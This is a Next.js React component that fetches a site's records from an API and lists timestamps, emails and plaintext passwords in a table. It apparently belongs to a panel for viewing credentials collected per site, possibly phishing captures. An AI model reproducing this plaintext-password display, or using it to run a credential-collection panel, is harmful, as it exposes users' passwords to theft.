import axiosInstance from "@/shared/api/api-instance";
import { tdStyle, thStyle } from "@/shared/constants/table-styles";
import Link from "next/link";
import { useRouter } from "next/router";
import { useEffect, useState } from "react";

export type Record = {
  created_at: string;
  email: string;
  password: string;
  id: string;
};

export function Records() {
  const router = useRouter();
  const siteId = router.query.id as string;
  const [records, setRecords] = useState([]);

  useEffect(() => {
    const RecordsData = async () => {
      try {
        const response = await axiosInstance.get(`/site/${siteId}`);
        setRecords(response.data.records);
      } catch (error) {
        console.error("error", error);
      }
    };
    RecordsData();
  }, []);

  return (
    <div className="flex flex-col items-start mt-20 mx-auto">
      <div className="flex justify-start w-full mb-4 flex-col">
        <span className="text-3xl text-gray-700">Records</span>
        <Link href="/">
          <span className="text-sm text-gray-700 underline">To sites</span>
        </Link>
      </div>
      <div className="w-full overflow-hidden overflow-y-auto">
        <table className="bg-white divide-y divide-gray-300 w-full">
          <thead className="bg-gray-200">
            <tr>
              <th className={thStyle}>Timestamps</th>
              <th className={thStyle}>Email</th>
              <th className={thStyle}>Password</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-gray-200">
            {records?.map((item: Record) => (
              <tr key={item.id} className="border-t border-gray-400">
                <td className={tdStyle}>{item.created_at}</td>
                <td className={tdStyle}>{item.email}</td>
                <td className={tdStyle}>{item.password}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
